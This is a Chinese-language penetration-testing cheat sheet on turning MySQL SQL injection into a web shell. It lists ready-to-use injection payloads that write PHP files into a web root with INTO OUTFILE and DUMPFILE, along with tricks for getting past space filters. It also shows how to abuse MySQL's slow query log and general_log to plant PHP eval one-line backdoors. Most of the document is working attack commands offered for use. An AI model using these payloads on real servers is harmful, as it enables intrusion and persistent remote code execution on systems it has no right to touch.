## outfile和dumpfile写shell

### 利用条件 

> 1. 数据库当前用户为root权限；
> 2. 知道当前网站的绝对路径；
> 3. `PHP`的`GPC`为 off状态；(魔术引号，GET，POST，Cookie)
> 4. 写入的那个路径存在写入权限。

### 基于union联合查询：

```bash
?id=1 union select 1,'<?php phpinfo();?>',3 into outfile 'C:\phpstudy\www\shell.php'%23
?id=1 union select 1,'<?php phpinfo();?>',3 into dumpfile 'C:\phpstudy\www\shell.php'%23
```

### 非联合查询

当我们无法使用联合查询时，我们可以使用`fields terminated by`与`lines terminated by`来写shell

```bash
?id=1 into outfile 'C:\phpstudy\www\shell.php' FIELDS TERMINATED BY '<?php phpinfo();?>'%23
```

**代替空格的方法**

+号，`%0a`、`%0b`、`%a0` 、 /**/ 注释符等

### outfile和dumpfile的区别 

`outfile`:

> 1、 支持多行数据同时导出
>
> 2、 使用union联合查询时，要保证两侧查询的列数相同
>
> 3、 会在换行符制表符后面追加反斜杠
>
> 4、会在末尾追加换行

`dumpfile`:

> 1、 每次只能导出一行数据
>
> 2、 不会在换行符制表符后面追加反斜杠
>
> 3、 不会在末尾追加换行

因此，我们可以使用`into dumpfile`这个函数来顺利写入二进制文件;

当然`into outfile`函数也可以写入二进制文件，但是无法生效（追加的反斜杠会使二进制文件无法生效）

当我们使用`dumpfile`，应该手动添加 limit 限制，来获取不同的行数

### secure_file_prive

MySQL的secure-file-prive参数是用来限制LOAD DATA, SELECT ,OUTFILE, and LOAD_FILE()传到哪个指定目录的。

>secure_file_prive= ，结果为空的话，表示允许任何文件读写
>
>secure_file_prive=NULL，表示不允许任何文件读写
>
>secure_file_prive='某个路径'，表示这个路径作为文件读写的路径
>
>在mysql5.5版本前，都是默认为空，允许读取
>
>在mysql5.6版本后 ,默认为NULL，并且无法用`SQL`语句对其进行修改。所以这种只能在配置进行修改。

查询`secure_file_prive`的参数

```
show global variables like "%secure%"
```

利用sql语句修改参数

```
set global secure_file_prive= 
```

但是5.6后不能利用sql修改了，所以只能利用配置修改

```
修改value的值：
windows下修改配置文件：mysql.ini
linux修改配置文件：my.cnf
```

## 日志getshell

###  慢日志getshell

慢日志：

一般都是通过long_query_time选项来设置这个时间值，时间以秒为单位，可以精确到微秒。如果查询时间超过了这个时间值（默认为10秒），这个查询语句将被记录到慢查询日志中。查看服务器默认时间值方式如下：

```
show global variables like '%long_query_time%'
show global variables like '%long%'
```

查看慢日志参数

```
show global variables like '%slow%'
```

![image-20220317103023917](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/e213bcc5ce67f55831780cc19618bf9e.png)

对慢日志参数进行修改

```
set global slow_query_log=1 #打开慢日志
set global slow_query_log_file='c:\\phpstudy\\www\\test.php'#慢日志的路径
注意：一定要用双反斜杠
SELECT '<?php @eval($_POST[1]);?>' or sleep(11)
这儿11是超过慢日志的10秒时间
```

### 利用general_log

利用`general_log`，可以将所有到达mysql服务器的sql语句，都记录下来。

相关参数一共有3个：general_log、log_output、general_log_file

```
show variables like 'general_log';  -- 查看日志是否开启
set global general_log=on; -- 开启日志功能


show variables like 'general_log_file';  -- 看看日志文件保存位置
set global general_log_file='tmp/general.lg'; -- 设置日志文件保存位置


show variables like 'log_output';  -- 看看日志输出类型  table或file
set global log_output='table'; -- 设置输出类型为 table
set global log_output='file';   -- 设置输出类型为file
```

一般log_output都是`file`,就是将日志存入文件中。`table`的话就是将日志存入数据库的日志表中。



**getshell**

```
set global general_log=on
set global general_log_file='需要攻击的路径'
select '<?php eval($_POST[cmd]);?>'
```

这样就将一句话木马记录到`general_log`中，从而getshell

###  binlog的介绍

[可以看看这个](https://blog.csdn.net/Abysscarry/article/details/79949480)